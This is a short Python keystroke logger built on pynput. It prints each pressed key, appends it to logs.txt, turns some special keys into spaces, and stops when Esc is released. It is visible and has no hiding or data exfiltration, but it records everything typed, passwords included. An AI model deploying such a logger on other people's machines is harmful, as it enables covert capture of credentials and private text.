import pynput
from pynput.keyboard import Key,Listener


def get_key(key):
    print(key," pressed")
    writelog(key)



def writelog(key):
    a = open("logs.txt",'a')
    format_key = str(key).replace("'","")
    if str(key).find("space")>0:
        a.write(" ")
    elif str(key).find("esc")>0:
        a.write(" ")
    elif str(key).find("shift")>0:
        a.write(" ")
    elif str(key).find("down")>0:
        a.write(" ")
    elif str(key).find("right")>0:
        a.write(" ")
    elif str(key).find("up")>0:
        a.write(" ")
    elif str(key).find("left")>0:
        a.write(" ")    
    else:
        a.write(format_key)


def stop_logger(key):
    if key == Key.esc:
        return False

with Listener(on_press=get_key,on_release=stop_logger) as listener:
    listener.join()